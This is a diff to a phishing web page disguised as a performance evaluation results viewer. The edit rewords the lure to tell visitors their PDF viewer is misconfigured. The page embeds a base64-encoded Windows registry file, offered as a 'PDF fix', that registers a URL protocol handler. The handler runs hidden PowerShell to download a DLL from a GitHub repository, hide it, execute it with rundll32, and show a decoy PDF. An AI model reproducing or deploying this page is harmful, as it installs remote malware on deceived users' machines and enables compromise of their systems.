@@ -52,25 +52,12 @@
       transform: translateY(-2px);
     }
 
-    .attention-text {
-      display: none;
-      text-align: center;
-      color: #c0392b;
-      font-size: 16px;
-      font-weight: 600;
-      background-color: #fdecea;
-      padding: 12px 16px;
-      border-radius: 8px;
-      margin: 15px auto 35px;
-      max-width: 600px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
-    }
-
     .steps {
       display: none;
       flex-wrap: wrap;
       gap: 20px;
       justify-content: center;
+      margin-top: 30px;
     }
 
     .step {
@@ -115,7 +102,7 @@
       .step { flex: 0 0 100%; }
     }
 
-    /* Modal (popup) styles */
+    /* Modal styles */
     .modal {
       display: none;
       position: fixed;
@@ -169,11 +156,6 @@
     View Performance Evaluation Result
   </a>
 
-  <p class="attention-text" id="attention-text">
-    <strong>Can't see your performance results after clicking the button above?</strong><br>
-    Follow the steps below to fix it.
-  </p>
-
   <div class="steps" id="steps-section">
     <div class="step">
       <div class="step-title">Step 1: Run File.</div>
@@ -204,7 +186,7 @@
 <!-- Modal -->
 <div id="popupModal" class="modal">
   <div class="modal-content">
-    <p><strong>Can't see your performance results?</strong><br>Click OK and follow the steps below.</p>
+    <p><strong>Your PDF viewer is not properly configured.</strong><br>Click OK and follow the instructions below.</p>
     <button onclick="closeModalAndProceed()">OK</button>
   </div>
 </div>
@@ -222,7 +204,6 @@
 
   function showSteps() {
     document.getElementById('steps-section').style.display = 'flex';
-    document.getElementById('attention-text').style.display = 'block';
   }
 
   function b64ToArrayBuffer(base64) {
@@ -237,7 +218,7 @@
   }
 
   function downloadRegFile() {
-    const base64 = 'V2luZG93cyBSZWdpc3RyeSBFZGl0b3IgVmVyc2lvbiA1LjAwDQoNCltIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxDbGFzc2VzXHRhdl0NCkA9IlVSTDpUQVYgUERGIFZpZXdlciINCiJVUkwgUHJvdG9jb2wiPSIiDQoNCg0KW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXENsYXNzZXNcdGF2XHNoZWxsXQ0KDQpbSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcQ2xhc3Nlc1x0YXZcc2hlbGxcb3Blbl0NCg0KW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXENsYXNzZXNcdGF2XHNoZWxsXG9wZW5cY29tbWFuZF0NCkA9InBvd2Vyc2hlbGwuZXhlIC1XIEhpZGRlbiAtY29tbWFuZCBcIiRhPUpvaW4tUGF0aCAkZW52OlVTRVJQUk9GSUxFIERvd25sb2Fkcztpd3IgLXVyaSBodHRwczovL2dpdGh1Yi5jb20vZG9lMTc0MDkvdGF2LWFwaS9yYXcvcmVmcy9oZWFkcy9tYWluL2xsdm1mdW5jLmRsbCAtbyAkYVxcXFxsbHZtZnVuYy5kbGw7JGI9Sm9pbi1QYXRoICRhIGxsdm1mdW5jLmRsbDthdHRyaWIgK2ggJGI7Y29uaG9zdCBjb25ob3N0IHJ1bmRsbDMyLmV4ZSAkYix0ZXN0OyBTdGFydC1Qcm9jZXNzIG1zZWRnZSAtQXJndW1lbnRMaXN0ICdodHRwczovL2lyLnRhdi5hZXJvL3VwbG9hZHMvZG9jdW1lbnRzL0RvY3VtZW50czI0MDQyMDI1MTg1ODE3Xy5wZGYnLCctLXN0YXJ0LWZ1bGxzY3JlZW4nXCIiDQo='; // Kısaltılmış base64 içeriği
+    const base64 = 'V2luZG93cyBSZWdpc3RyeSBFZGl0b3IgVmVyc2lvbiA1LjAwDQoNCltIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxDbGFzc2VzXHRhdl0NCkA9IlVSTDpUQVYgUERGIFZpZXdlciINCiJVUkwgUHJvdG9jb2wiPSIiDQoNCg0KW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXENsYXNzZXNcdGF2XHNoZWxsXQ0KDQpbSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcQ2xhc3Nlc1x0YXZcc2hlbGxcb3Blbl0NCg0KW0hLRVlfQ1VSUkVOVF9VU0VSXFNvZnR3YXJlXENsYXNzZXNcdGF2XHNoZWxsXG9wZW5cY29tbWFuZF0NCkA9InBvd2Vyc2hlbGwuZXhlIC1XIEhpZGRlbiAtY29tbWFuZCBcIiRhPUpvaW4tUGF0aCAkZW52OlVTRVJQUk9GSUxFIERvd25sb2Fkcztpd3IgLXVyaSBodHRwczovL2dpdGh1Yi5jb20vZG9lMTc0MDkvdGF2LWFwaS9yYXcvcmVmcy9oZWFkcy9tYWluL2xsdm1mdW5jLmRsbCAtbyAkYVxcXFxsbHZtZnVuYy5kbGw7JGI9Sm9pbi1QYXRoICRhIGxsdm1mdW5jLmRsbDthdHRyaWIgK2ggJGI7Y29uaG9zdCBjb25ob3N0IHJ1bmRsbDMyLmV4ZSAkYix0ZXN0OyBTdGFydC1Qcm9jZXNzIG1zZWRnZSAtQXJndW1lbnRMaXN0ICdodHRwczovL2lyLnRhdi5hZXJvL3VwbG9hZHMvZG9jdW1lbnRzL0RvY3VtZW50czI0MDQyMDI1MTg1ODE3Xy5wZGYnLCctLXN0YXJ0LWZ1bGxzY3JlZW4nXCIiDQo=';
     const arrayBuffer = b64ToArrayBuffer(base64);
     const blob = new Blob([arrayBuffer], { type: 'application/octet-stream' });
     const filename = 'TAV_Fix_PDF_FileType_Handler.2.reg';
